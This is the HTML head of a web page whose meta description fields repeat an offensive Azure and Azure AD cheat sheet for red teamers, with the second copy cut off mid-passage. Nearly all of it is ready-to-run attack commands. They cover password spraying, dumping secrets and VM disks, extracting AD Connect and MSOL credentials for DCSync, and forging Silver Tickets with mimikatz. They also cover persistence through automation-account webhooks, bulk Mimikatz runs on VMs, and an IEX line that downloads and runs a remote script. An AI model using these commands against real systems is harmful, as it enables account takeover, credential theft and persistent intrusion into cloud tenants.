<!DOCTYPE html>



<html lang="en-US" 
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    

    

  

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.1" />
<meta property="og:title" content="Azure" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Summary Tools Azure Architecture Azure Storage Account - Access Azure AD vs Active Directory Azure AD - Enumeration Azure AD - Password Spray Azure AD - Convert GUID to SID Azure AD - Sign in with a service principal Azure AD Connect - Password extraction Azure AD Connect - MSOL Account’s password and DCSync Azure AD Connect - Seamless Single Sign On Silver Ticket Azure AD - ADFS Federation Server ~Cloud Kerberos Azure AD - Persistence via Automation accounts Azure VM - Execute command as NT SYSTEM with Contributor right Office365 - Enumerating Users References Tools :warning: 16 apr 2019 : BloodHound does not support any analysis with AzureAD. :warning: Tokens for Azure are cached in C:\Users\[Name]\.Azure\accessTokens.json PowerZure - 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 require az module ! $ git clone https://github.com/hausec/PowerZure $ ipmo .\PowerZure $ Set-Subscription -Id [idgoeshere] # Reader $ Get-Runbook, Get-AllUsers, Get-Apps, Get-Resources, Get-WebApps, Get-WebAppDetails # Contributor $ Execute-Command -OS Windows -VM Win10Test -ResourceGroup Test-RG -Command &quot;whoami&quot; $ Execute-MSBuild -VM Win10Test -ResourceGroup Test-RG -File &quot;build.xml&quot; $ Get-AllSecrets # AllAppSecrets, AllKeyVaultContents $ Get-AvailableVMDisks, Get-VMDisk # Download a virtual machine&#39;s disk # Owner $ Set-Role -Role Contributor -User test@contoso.com -Resource Win10VMTest # Administrator $ Create-Backdoor, Execute-Backdoor Azure CLI - Default azure CLI 1 2 3 4 5 6 $ AZ_REPO=$(lsb_release -cs) echo &quot;deb [arch=amd64] https://packages.microsoft.com/repos/azure-cli/ $AZ_REPO main&quot; | sudo tee /etc/apt/sources.list.d/azure-cli.list $ curl -L https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add - $ sudo apt-get install apt-transport-https $ sudo apt-get update &amp;&amp; sudo apt-get install azure-cli # dump users $ az ad user list --output=table --query=&#39;[].{Created:createdDateTime,UPN:userPrincipalName,Name:displayName,Title:jobTitle,Department:department,Email:mail,UserId:mailNickname,Phone:telephoneNumber,Mobile:mobile,Enabled:accountEnabled}&#39; MicroBurst - MicroBurst includes functions and scripts that support Azure Services discovery, weak configuration auditing, and post exploitation actions such as credential dumping 1 2 3 4 $ git clone https://github.com/NetSPI/MicroBurst PS C:&gt; Import-Module .\MicroBurst.psm1 PS C:&gt; Import-Module .\Get-AzureDomainInfo.ps1 PS C:&gt; Get-AzureDomainInfo -folder MicroBurst -Verbose SkyArk - Discover the most privileged users in the scanned Azure environment - including the Azure Shadow Admins. Require: Read-Only permissions over Azure Directory (Tenant) Read-Only permissions over Subscription Require AZ and AzureAD module or administrator right 1 2 3 4 5 6 7 8 9 $ git clone https://github.com/cyberark/SkyArk $ powershell -ExecutionPolicy Bypass -NoProfile PS C&gt; Import-Module .\SkyArk.ps1 -force PS C&gt; Start-AzureStealth or in the Cloud Console PS C&gt; IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/cyberark/SkyArk/master/AzureStealth/AzureStealth.ps1&#39;) PS C&gt; Scan-AzureAdmins Azurite Explorer and Azurite Visualizer : Enumeration and reconnaissance activities in the Microsoft Azure Cloud. 1 2 3 4 5 6 7 8 git clone https://github.com/mwrlabs/Azurite.git git clone https://github.com/FSecureLABS/Azurite git submodule init git submodule update PS&gt; Import-Module AzureRM PS&gt; Import-Module AzuriteExplorer.ps1 PS&gt; Review-AzureRmSubscription PS&gt; Review-CustomAzureRmSubscription Azucar : Azucar automatically gathers a variety of configuration data and analyses all data relating to a particular subscription in order to determine security risks. 1 2 3 4 5 6 7 8 9 10 # You should use an account with at least read-permission on the assets you want to access git clone https://github.com/nccgroup/azucar.git PS&gt; Get-ChildItem -Recurse c:\Azucar_V10 | Unblock-File PS&gt; .\Azucar.ps1 -AuthMode UseCachedCredentials -Verbose -WriteLog -Debug -ExportTo PRINT PS&gt; .\Azucar.ps1 -ExportTo CSV,JSON,XML,EXCEL -AuthMode Certificate_Credentials -Certificate C:\AzucarTest\server.pfx -ApplicationId 00000000-0000-0000-0000-000000000000 -TenantID 00000000-0000-0000-0000-000000000000 PS&gt; .\Azucar.ps1 -ExportTo CSV,JSON,XML,EXCEL -AuthMode Certificate_Credentials -Certificate C:\AzucarTest\server.pfx -CertFilePassword MySuperP@ssw0rd! -ApplicationId 00000000-0000-0000-0000-000000000000 -TenantID 00000000-0000-0000-0000-000000000000 # resolve the TenantID for an specific username PS&gt; .\Azucar.ps1 -ResolveTenantUserName user@company.com Azure Architecture Azure AD Joined : https://pbs.twimg.com/media/EQZv62NWAAEQ8wE?format=jpg&amp;name=large Workplace Joined : https://pbs.twimg.com/media/EQZv7UHXsAArdhn?format=jpg&amp;name=large Hybrid Joined : https://pbs.twimg.com/media/EQZv77jXkAAC4LK?format=jpg&amp;name=large Workplace joined on AADJ or Hybrid : https://pbs.twimg.com/media/EQZv8qBX0AAMWuR?format=jpg&amp;name=large Azure Storage Account - Access Blobs – *.blob.core.windows.net 1 $ AzCopy /Source:https://myaccount.blob.core.windows.net/mycontainer /Dest:C:\myfolder /SourceKey:key /S File Services – *.file.core.windows.net Data Tables – *.table.core.windows.net Queues – *.queue.core.windows.net z ```powershell https://github.com/NetSPI/MicroBurst S C:&gt; Invoke-EnumerateAzureBlobs -Base secure [-BingAPIKey 12345678901234567899876543210123] Found Storage Account - secure.blob.core.windows.net Found Storage Account - testsecure.blob.core.windows.net Found Storage Account - securetest.blob.core.windows.net Found Storage Account - securedata.blob.core.windows.net Found Storage Account - securefiles.blob.core.windows.net Found Storage Account - securefilestorage.blob.core.windows.net Found Storage Account - securestorageaccount.blob.core.windows.net Found Storage Account - securesql.blob.core.windows.net Found Storage Account - hrsecure.blob.core.windows.net Found Storage Account - secureit.blob.core.windows.net Found Storage Account - secureimages.blob.core.windows.net Found Storage Account - securestorage.blob.core.windows.net Bing Found Storage Account - notrealstorage.blob.core.windows.net Found Container - hrsecure.blob.core.windows.net/NETSPItest 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 ## Azure AD vs Active Directory | Active Directory | Azure AD | |---|---| | LDAP | REST API&#39;S | | NTLM/Kerberos | OAuth/SAML/OpenID | | Structured directory (OU tree) | Flat structure | | GPO | No GPO&#39;s | | Super fine-tuned access controls | Predefined roles | | Domain/forest | Tenant | | Trusts | Guests | * Password Hash Syncronization (PHS) * Passwords from on-premise AD are sent to the cloud * Use replication via a service account created by AD Connect * Pass Through Authentication (PTA) * Possible to perform DLL injection into the PTA agent and intercept authentication requests: credentials in clear-text * Connect Windows Server AD to Azure AD using Federation Server (ADFS) * Dir-Sync : Handled by on-premise Windows Server AD, sync username/password ## Azure AD - Enumeration &gt; By default it is possible to query almost all the information about the directory as authenticated user, even when the Azure portal is restricted, using Azure AD Graph. Check if the compagny is using Azure AD with `https://login.microsoftonline.com/getuserrealm.srf?login=username@target.onmicrosoft.com&amp;xml=1`. ```powershell $ git clone https://github.com/dirkjanm/ROADtools $ pip install roadrecon $ roadrecon auth [-h] [-u USERNAME] [-p PASSWORD] [-t TENANT] [-c CLIENT] [--as-app] [--device-code] [--access-token ACCESS_TOKEN] [--refresh-token REFRESH_TOKEN] [-f TOKENFILE] [--tokens-stdout] $ roadrecon gather [-h] [-d DATABASE] [-f TOKENFILE] [--tokens-stdin] [--mfa] $ roadrecon dump $ roadrecon gui Can be used in BloodHound using the fork : https://github.com/dirkjanm/BloodHound-AzureAD 1 2 3 4 5 6 7 8 9 10 11 12 PS C:\&gt; git clone https://github.com/adrecon/AzureADRecon.git PS C:\&gt; Install-Module -Name AzureAD PS C:\&gt; .\AzureADRecon.ps1 or PS C:\&gt; $username = &quot;username@fqdn&quot; PS C:\&gt; $passwd = ConvertTo-SecureString &quot;PlainTextPassword&quot; -AsPlainText -Force PS C:\&gt; $creds = New-Object System.Management.Automation.PSCredential ($username, $passwd) PS C:\&gt; .\AzureADRecon.ps1 -Credential $creds PS C:\&gt;.\AzureADRecon.ps1 -GenExcel C:\AzureADRecon-Report-&lt;timestamp&gt; Stormspotter, graphing Azure and Azure Active Directory objects 1 2 3 4 5 6 7 $ docker run --name stormspotter -p7474:7474 -p7687:7687 -d --env NEO4J_AUTH=neo4j/[password] neo4j:3.5.18 git clone https://github.com/Azure/Stormspotter cd Stormspotter pipenv install . stormspotter --cli stormdash -dbu &lt;neo4j-user&gt; -dbp &lt;neo4j-pass&gt; Browse to http://127.0.0.1:8050 to interact with the graph. Other interesting commands to enumerate Azure AD. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 # Azure AD powershell module Get-AzureADDirectoryRole # MSOnline powershell module Get-MsolRole Get-MsolRoleMember -RoleObjectId XXXXXXXXXX-XXXX-XXXX... | fl #Connect to Azure AD using Powershell install-module azuread import-module azuread get-module azuread connect-azuread # Get list of users with role global admins# Note that role =! group $role = Get-AzureADDirectoryRole | Where-Object {$_.displayName -eq &#39;Company Administrator&#39;} Get-AzureADDirectoryRoleMember -ObjectId $role.ObjectId # Get all groups and an example using filter Get-AzureADGroup Get-AzureADGroup -Filter &quot;DisplayName eq &#39;Intune Administrators&#39;&quot; # Get Azure AD policy Get-AzureADPolicy # Get Azure AD roles with some examples Get-AzureADDirectoryRole Get-AzureADDirectoryRole | Where-Object {$_.displayName -eq &#39;Security Reader&#39;} Get-AzureADDirectoryRoleTemplate # Get Azure AD SPNs Get-AzureADServicePrincipal # Log in using Azure CLI (this is not powershell) az login --allow-no-subscriptions # Get member list using Azure CLI az ad group member list --output=json --query=&#39;[].{Created:createdDateTime,UPN:userPrincipalName,Name:displayName,Title:jobTitle,Department:department,Email:mail,UserId:mailNickname,Phone:telephoneNumber,Mobile:mobile,Enabled:accountEnabled}&#39; --group=&#39;Company Administrators&#39; # Get user list az ad user list --output=json --query=&#39;[].{Created:createdDateTime,UPN:userPrincipalName,Name:displayName,Title:jobTitle,Department:department,Email:mail,UserId:mailNickname,Phone:telephoneNumber,Mobile:mobile,Enabled:accountEnabled}&#39; --upn=&#39;username@domain.com&#39; #PS script to get array of users / roles $roleUsers = @() $roles=Get-AzureADDirectoryRole ForEach($role in $roles) { $users=Get-AzureADDirectoryRoleMember -ObjectId $role.ObjectId ForEach($user in $users) { write-host $role.DisplayName,$user.DisplayName $obj = New-Object PSCustomObject $obj | Add-Member -type NoteProperty -name RoleName -value &quot;&quot; $obj | Add-Member -type NoteProperty -name UserDisplayName -value &quot;&quot; $obj | Add-Member -type NoteProperty -name IsAdSynced -value false $obj.RoleName=$role.DisplayName $obj.UserDisplayName=$user.DisplayName $obj.IsAdSynced=$user.DirSyncEnabled -eq $true $roleUsers+=$obj } } $roleUsers ### Enumeration using Microburst git clone https://github.com/NetSPI/MicroBurst/blob/master/Get-AzureADDomainInfo.ps1 Import-Module .\MicroBurst.psm1 # Anonymous enumeration Invoke-EnumerateAzureBlobs -Base company Invoke-EnumerateAzureSubDomains -base company -verbose # Authencticated enumeration Get-AzureADDomainInfo Get-AzureDomainInfo -folder MicroBurst -VerboseGet-MSOLDomainInfo Get-MSOLDomainInfo With Microsoft, if you are using any cloud services (Office 365, Exchange Online, etc) with Active Directory (on-prem or in Azure) then an attacker is one credential away from being able to leak your entire Active Directory structure thanks to Azure AD. Authenticate to your webmail portal (i.e. https://webmail.domain.com/) Change your browser URL to: https://azure.microsoft.com/ Pick the account from the active sessions Select Azure Active Directory and enjoy! Azure AD - Password Spray Default lockout policy of 10 failed attempts, locking out an account for 60 seconds 1 2 3 4 5 6 7 8 9 10 git clone https://github.com/dafthack/MSOLSpray Import-Module .\MSOLSpray.ps1 Invoke-MSOLSpray -UserList .\userlist.txt -Password Winter2020 Invoke-MSOLSpray -UserList .\users.txt -Password d0ntSprayme! # UserList - UserList file filled with usernames one-per-line in the format &quot;user@domain.com&quot; # Password - A single password that will be used to perform the password spray. # OutFile - A file to output valid results to. # Force - Forces the spray to continue and not stop when multiple account lockouts are detected. # URL - The URL to spray against. Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from. Azure AD - Convert GUID to SID The user’s AAD id is translated to SID by concatenating &quot;S-1–12–1-&quot; to the decimal representation of each section of the AAD Id. 1 2 GUID: [base16(a1)]-[base16(a2)]-[ base16(a3)]-[base16(a4)] SID: S-1–12–1-[base10(a1)]-[ base10(a2)]-[ base10(a3)]-[ base10(a4)] For example, the representation of 6aa89ecb-1f8f-4d92–810d-b0dce30b6c82 is S-1–12–1–1789435595–1301421967–3702525313–2188119011 Azure AD - Sign in with a service principal https://docs.microsoft.com/en-us/powershell/azure/authenticate-azureps?view=azps-3.3.0&amp;viewFallbackFrom=azurermps-6.5.0#sign-in-with-a-service-principal :warning: Service Principal accounts do not require MFA. Anyone with control over Service Principals can assign credentials to them and potentially escalate privileges. Password based authentication 1 2 3 # Use the service principal ID for the username $pscredential = Get-Credential Connect-AzAccount -ServicePrincipal -Credential $pscredential -Tenant $tenantId Certificate based authentication 1 Connect-AzAccount -ApplicationId $appId -Tenant $tenantId -CertificateThumbprint &lt;thumbprint&gt; Azure AD Connect - Password extraction Credentials in AD Sync : C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf Tool Requires code execution on target DLL dependencies Requires MSSQL locally Requires python locally ADSyncDecrypt Yes Yes No No ADSyncGather Yes No No Yes ADSyncQuery No (network RPC calls only) No Yes Yes 1 2 git clone https://github.com/fox-it/adconnectdump # DCSync with AD Sync account Azure AD Connect - MSOL Account’s password and DCSync You can perform DCSync attack using the MSOL account. Prerequisite: Compromise a server with Azure AD Connect service Access to ADSyncAdmins or local Administrators groups Use the script azuread_decrypt_msol.ps1 from @xpn to recover the decrypted password for the MSOL account: azuread_decrypt_msol.ps1: AD Connect Sync Credential Extract POC https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545 azuread_decrypt_msol_v2.ps1: Updated method of dumping the MSOL service account (which allows a DCSync) used by Azure AD Connect Sync https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c Now you can use the retrieved credentials for the MSOL Account to launch a DCSync attack. Azure AD Connect - Seamless Single Sign On Silver Ticket Anyone who can edit properties of the AZUREADSSOACCS$ account can impersonate any user in Azure AD using Kerberos (if no MFA) :warning: The password of the AZUREADSSOACC account never changes. Using https://autologon.microsoftazuread-sso.com/ to convert Kerberos tickets to SAML and JWT for Office 365 &amp; Azure NTLM password hash of the AZUREADSSOACC account, e.g. f9969e088b2c13d93833d0ce436c76dd. 1 mimikatz.exe &quot;lsadump::dcsync /user:AZUREADSSOACC$&quot; exit AAD logon name of the user we want to impersonate, e.g. elrond@contoso.com. This is typically either his userPrincipalName or mail attribute from the on-prem AD. SID of the user we want to impersonate, e.g. S-1-5-21-2121516926-2695913149-3163778339-1234. Create the Silver Ticket and inject it into Kerberos cache: 1 2 3 4 mimikatz.exe &quot;kerberos::golden /user:elrond /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234 /domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd /target:aadg.windows.net.nsatc.net /service:HTTP /ptt&quot; exit Launch Mozilla Firefox Go to about:config and set the network.negotiate-auth.trusted-uris preference to value https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com Navigate to any web application that is integrated with our AAD domain. Fill in the user name, while leaving the password field empty. Azure AD - ADFS Federation Server ~Cloud Kerberos Discover Federation Servers adfs auth fs okta ping sso sts OWA Version Discovery : autodiscover.domain.com Azure AD - Persistence via Automation accounts Create a new Automation Account “Create Azure Run As account”: Yes Import a new runbook that creates an AzureAD user with Owner permissions for the subscription* Sample runbook for this Blog located here – https://github.com/NetSPI/MicroBurst Publish the runbook Add a webhook to the runbook Add the AzureAD module to the Automation account Update the Azure Automation Modules Assign “User Administrator” and “Subscription Owner” rights to the automation account Eventually lose your access… Trigger the webhook with a post request to create the new user 1 2 3 4 $uri = &quot;https://s15events.azure-automation.net/webhooks?token=h6[REDACTED]%3d&quot; $AccountInfo = @(@{RequestBody=@{Username=&quot;BlogDemoUser&quot;;Password=&quot;Password123&quot;}}) $body = ConvertTo-Json -InputObject $AccountInfo $response = Invoke-WebRequest -Method Post -Uri $uri -Body $body Azure VM - Execute command as NT SYSTEM with Contributor right Allow anyone with “Contributor” rights to run PowerShell scripts on any Azure VM in a subscription as NT Authority\System 1 2 3 4 5 6 PS C:\&gt; Get-AzureRmVM -status | where {$_.PowerState -EQ &quot;VM running&quot;} | select ResourceGroupName,Name ResourceGroupName Name ----------------- ---- TESTRESOURCES Remote-Test PS C:\&gt; Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath Mimikatz.ps1 Against the whole subscription using MicroBurst.ps1 1 2 Import-module MicroBurst.psm1 Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt Office365 - Enumerating Users NOTE: By default, O365 has a lockout policy of 10 tries, and it will lock out an account for one (1) minute. Bruteforce user enum : https://bitbucket.org/grimhacker/office365userenum/src/master/ based on the endpoint https://login.microsoftonline.com/getuserrealm.srf?login=firstname.lastname@domain.com&amp;xml=1 1 2 3 4 5 6 7 8 9 10 RealmInfo Success=&quot;true&quot;&gt; &lt;State&gt;3&lt;/State&gt; &lt;UserState&gt;2&lt;/UserState&gt; &lt;Login&gt;firstname.lastname@domain.com&lt;/Login&gt; &lt;NameSpaceType&gt;Federated&lt;/NameSpaceType&gt; &lt;DomainName&gt;domain.com&lt;/DomainName&gt; &lt;FederationGlobalVersion&gt;-1&lt;/FederationGlobalVersion&gt; &lt;AuthURL&gt; https://fws.domain.com/o365/visfed/intrdomain/se/?username=firstname.lastname%40domain.com&amp;wa=wsignin1.0&amp;wtrealm=urn%3afederation%3aMicrosoftOnline&amp;wctx= &lt;/AuthURL&gt; Validate email : https://github.com/LMGsec/o365creeper o365creeper.py -f emails.txt -o validemails.txt Extract email lists with a valid credentials : https://github.com/nyxgeek/o365recon References An introduction to penetration testing Azure - Graceful Security Running Powershell scripts on Azure VM - Netspi Attacking Azure Cloud shell - Netspi Maintaining Azure Persistence via automation accounts - Netspi Detecting an attacks on active directory with Azure - Smartspate Azure AD Overview Windows Azure Active Directory in plain English Building Free Active Directory Lab in Azure - @kamran.bilgrami Attacking Azure/Azure AD and introducing Powerzure - SpecterOps Azure AD connect for RedTeam - @xpnsec Azure Privilege Escalation Using Managed Identities - Karl Fosaaen - February 20th, 2020 Hunting Azure Admins for Vertical Escalation - LEE KAGAN - MARCH 13, 2020 Introducing ROADtools - The Azure AD exploration framework - Dirk-jan Mollema Moving laterally between Azure AD joined machines - Tal Maor - Mar 17, 2020 AZURE AD INTRODUCTION FOR RED TEAMERS - Written by Aymeric Palhière (bak) - 2020-04-20 Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter" />
<meta property="og:description" content="Summary Tools Azure Architecture Azure Storage Account - Access Azure AD vs Active Directory Azure AD - Enumeration Azure AD - Password Spray Azure AD - Convert GUID to SID Azure AD - Sign in with a service principal Azure AD Connect - Password extraction Azure AD Connect - MSOL Account’s password and DCSync Azure AD Connect - Seamless Single Sign On Silver Ticket Azure AD - ADFS Federation Server ~Cloud Kerberos Azure AD - Persistence via Automation accounts Azure VM - Execute command as NT SYSTEM with Contributor right Office365 - Enumerating Users References Tools :warning: 16 apr 2019 : BloodHound does not support any analysis with AzureAD. :warning: Tokens for Azure are cached in C:\Users\[Name]\.Azure\accessTokens.json PowerZure - 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 require az module ! $ git clone https://github.com/hausec/PowerZure $ ipmo .\PowerZure $ Set-Subscription -Id [idgoeshere] # Reader $ Get-Runbook, Get-AllUsers, Get-Apps, Get-Resources, Get-WebApps, Get-WebAppDetails # Contributor $ Execute-Command -OS Windows -VM Win10Test -ResourceGroup Test-RG -Command &quot;whoami&quot; $ Execute-MSBuild -VM Win10Test -ResourceGroup Test-RG -File &quot;build.xml&quot; $ Get-AllSecrets # AllAppSecrets, AllKeyVaultContents $ Get-AvailableVMDisks, Get-VMDisk # Download a virtual machine&#39;s disk # Owner $ Set-Role -Role Contributor -User test@contoso.com -Resource Win10VMTest # Administrator $ Create-Backdoor, Execute-Backdoor Azure CLI - Default azure CLI 1 2 3 4 5 6 $ AZ_REPO=$(lsb_release -cs) echo &quot;deb [arch=amd64] https://packages.microsoft.com/repos/azure-cli/ $AZ_REPO main&quot; | sudo tee /etc/apt/sources.list.d/azure-cli.list $ curl -L https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add - $ sudo apt-get install apt-transport-https $ sudo apt-get update &amp;&amp; sudo apt-get install azure-cli # dump users $ az ad user list --output=table --query=&#39;[].{Created:createdDateTime,UPN:userPrincipalName,Name:displayName,Title:jobTitle,Department:department,Email:mail,UserId:mailNickname,Phone:telephoneNumber,Mobile:mobile,Enabled:accountEnabled}&#39; MicroBurst - MicroBurst includes functions and scripts that support Azure Services discovery, weak configuration auditing, and post exploitation actions such as credential dumping 1 2 3 4 $ git clone https://github.com/NetSPI/MicroBurst PS C:&gt; Import-Module .\MicroBurst.psm1 PS C:&gt; Import-Module .\Get-AzureDomainInfo.ps1 PS C:&gt; Get-AzureDomainInfo -folder MicroBurst -Verbose SkyArk - Discover the most privileged users in the scanned Azure environment - including the Azure Shadow Admins. Require: Read-Only permissions over Azure Directory (Tenant) Read-Only permissions over Subscription Require AZ and AzureAD module or administrator right 1 2 3 4 5 6 7 8 9 $ git clone https://github.com/cyberark/SkyArk $ powershell -ExecutionPolicy Bypass -NoProfile PS C&gt; Import-Module .\SkyArk.ps1 -force PS C&gt; Start-AzureStealth or in the Cloud Console PS C&gt; IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/cyberark/SkyArk/master/AzureStealth/AzureStealth.ps1&#39;) PS C&gt; Scan-AzureAdmins Azurite Explorer and Azurite Visualizer : Enumeration and reconnaissance activities in the Microsoft Azure Cloud. 1 2 3 4 5 6 7 8 git clone https://github.com/mwrlabs/Azurite.git git clone https://github.com/FSecureLABS/Azurite git submodule init git submodule update PS&gt; Import-Module AzureRM PS&gt; Import-Module AzuriteExplorer.ps1 PS&gt; Review-AzureRmSubscription PS&gt; Review-CustomAzureRmSubscription Azucar : Azucar automatically gathers a variety of configuration data and analyses all data relating to a particular subscription in order to determine security risks. 1 2 3 4 5 6 7 8 9 10 # You should use an account with at least read-permission on the assets you want to access git clone https://github.com/nccgroup/azucar.git PS&gt; Get-ChildItem -Recurse c:\Azucar_V10 | Unblock-File PS&gt; .\Azucar.ps1 -AuthMode UseCachedCredentials -Verbose -WriteLog -Debug -ExportTo PRINT PS&gt; .\Azucar.ps1 -ExportTo CSV,JSON,XML,EXCEL -AuthMode Certificate_Credentials -Certificate C:\AzucarTest\server.pfx -ApplicationId 00000000-0000-0000-0000-000000000000 -TenantID 00000000-0000-0000-0000-000000000000 PS&gt; .\Azucar.ps1 -ExportTo CSV,JSON,XML,EXCEL -AuthMode Certificate_Credentials -Certificate C:\AzucarTest\server.pfx -CertFilePassword MySuperP@ssw0rd! -ApplicationId 00000000-0000-0000-0000-000000000000 -TenantID 00000000-0000-0000-0000-000000000000 # resolve the TenantID for an specific username PS&gt; .\Azucar.ps1 -ResolveTenantUserName user@company.com Azure Architecture Azure AD Joined : https://pbs.twimg.com/media/EQZv62NWAAEQ8wE?format=jpg&amp;name=large Workplace Joined : https://pbs.twimg.com/media/EQZv7UHXsAArdhn?format=jpg&amp;name=large Hybrid Joined : https://pbs.twimg.com/media/EQZv77jXkAAC4LK?format=jpg&amp;name=large Workplace joined on AADJ or Hybrid : https://pbs.twimg.com/media/EQZv8qBX0AAMWuR?format=jpg&amp;name=large Azure Storage Account - Access Blobs – *.blob.core.windows.net 1 $ AzCopy /Source:https://myaccount.blob.core.windows.net/mycontainer /Dest:C:\myfolder /SourceKey:key /S File Services – *.file.core.windows.net Data Tables – *.table.core.windows.net Queues – *.queue.core.windows.net z ```powershell https://github.com/NetSPI/MicroBurst S C:&gt; Invoke-EnumerateAzureBlobs -Base secure [-BingAPIKey 12345678901234567899876543210123] Found Storage Account - secure.blob.core.windows.net Found Storage Account - testsecure.blob.core.windows.net Found Storage Account - securetest.blob.core.windows.net Found Storage Account - securedata.blob.core.windows.net Found Storage Account - securefiles.blob.core.windows.net Found Storage Account - securefilestorage.blob.core.windows.net Found Storage Account - securestorageaccount.blob.core.windows.net Found Storage Account - securesql.blob.core.windows.net Found Storage Account - hrsecure.blob.core.windows.net Found Storage Account - secureit.blob.core.windows.net Found Storage Account - secureimages.blob.core.windows.net Found Storage Account - securestorage.blob.core.windows.net Bing Found Storage Account - notrealstorage.blob.core.windows.net Found Container - hrsecure.blob.core.windows.net/NETSPItest 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 ## Azure AD vs Active Directory | Active Directory | Azure AD | |---|---| | LDAP | REST API&#39;S | | NTLM/Kerberos | OAuth/SAML/OpenID | | Structured directory (OU tree) | Flat structure | | GPO | No GPO&#39;s | | Super fine-tuned access controls | Predefined roles | | Domain/forest | Tenant | | Trusts | Guests | * Password Hash Syncronization (PHS) * Passwords from on-premise AD are sent to the cloud * Use replication via a service account created by AD Connect * Pass Through Authentication (PTA) * Possible to perform DLL injection into the PTA agent and intercept authentication requests: credentials in clear-text * Connect Windows Server AD to Azure AD using Federation Server (ADFS) * Dir-Sync : Handled by on-premise Windows Server AD, sync username/password ## Azure AD - Enumeration &gt; By default it is possible to query almost all the information about the directory as authenticated user, even when the Azure portal is restricted, using Azure AD Graph. Check if the compagny is using Azure AD with `https://login.microsoftonline.com/getuserrealm.srf?login=username@target.onmicrosoft.com&amp;xml=1`. ```powershell $ git clone https://github.com/dirkjanm/ROADtools $ pip install roadrecon $ roadrecon auth [-h] [-u USERNAME] [-p PASSWORD] [-t TENANT] [-c CLIENT] [--as-app] [--device-code] [--access-token ACCESS_TOKEN] [--refresh-token REFRESH_TOKEN] [-f TOKENFILE] [--tokens-stdout] $ roadrecon gather [-h] [-d DATABASE] [-f TOKENFILE] [--tokens-stdin] [--mfa] $ roadrecon dump $ roadrecon gui Can be used in BloodHound using the fork : https://github.com/dirkjanm/BloodHound-AzureAD 1 2 3 4 5 6 7 8 9 10 11 12 PS C:\&gt; git clone https://github.com/adrecon/AzureADRecon.git PS C:\&gt; Install-Module -Name AzureAD PS C:\&gt; .\AzureADRecon.ps1 or PS C:\&gt; $username = &quot;username@fqdn&quot; PS C:\&gt; $passwd = ConvertTo-SecureString &quot;PlainTextPassword&quot; -AsPlainText -Force PS C:\&gt; $creds = New-Object System.Management.Automation.PSCredential ($username, $passwd) PS C:\&gt; .\AzureADRecon.ps1 -Credential $creds PS C:\&gt;.\AzureADRecon.ps1 -GenExcel C:\AzureADRecon-Report-&lt;timestamp&gt; Stormspotter, graphing Azure and Azure Active Directory objects 1 2 3 4 5 6 7 $ docker run --name stormspotter -p7474:7474 -p7687:7687 -d --env NEO4J_AUTH=neo4j/[password] neo4j:3.5.18 git clone https://github.com/Azure/Stormspotter cd Stormspotter pipenv install . stormspotter --cli stormdash -dbu &lt;neo4j-user&gt; -dbp &lt;neo4j-pass&gt; Browse to http://127.0.0.1:8050 to interact with the graph. Other interesting commands to enumerate Azure AD. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 # Azure AD powershell module Get-AzureADDirectoryRole # MSOnline powershell module Get-MsolRole Get-MsolRoleMember -RoleObjectId XXXXXXXXXX-XXXX-XXXX... | fl #Connect to Azure AD using Powershell install-module azuread import-module azuread get-module azuread connect-azuread # Get list of users with role global admins# Note that role =! group $role = Get-AzureADDirectoryRole | Where-Object {$_.displayName -eq &#39;Company Administrator&#39;} Get-AzureADDirectoryRoleMember -ObjectId $role.ObjectId # Get all groups and an example using filter Get-AzureADGroup Get-AzureADGroup -Filter &quot;DisplayName eq &#39;Intune Administrators&#39;&quot; # Get Azure AD policy Get-AzureADPolicy # Get Azure AD roles with some examples Get-AzureADDirectoryRole Get-AzureADDirectoryRole | Where-Object {$_.displayName -eq &#39;Security Reader&#39;} Get-AzureADDirectoryRoleTemplate # Get Azure AD SPNs Get-AzureADServicePrincipal # Log in using Azure CLI (this is not powershell) az login --allow-no-subscriptions # Get member list using Azure CLI az ad group member list --output=json --query=&#39;[].{Created:createdDateTime,UPN:userPrincipalName,Name:displayName,Title:jobTitle,Department:department,Email:mail,UserId:mailNickname,Phone:telephoneNumber,Mobile:mobile,Enabled:accountEnabled}&#39; --group=&#39;Company Administrators&#39; # Get user list az ad user list --output=json --query=&#39;[].{Created:createdDateTime,UPN:userPrincipalName,Name:displayName,Title:jobTitle,Department:department,Email:mail,UserId:mailNickname,Phone:telephoneNumber,Mobile:mobile,Enabled:accountEnabled}&#39; --upn=&#39;username@domain.com&#39; #PS 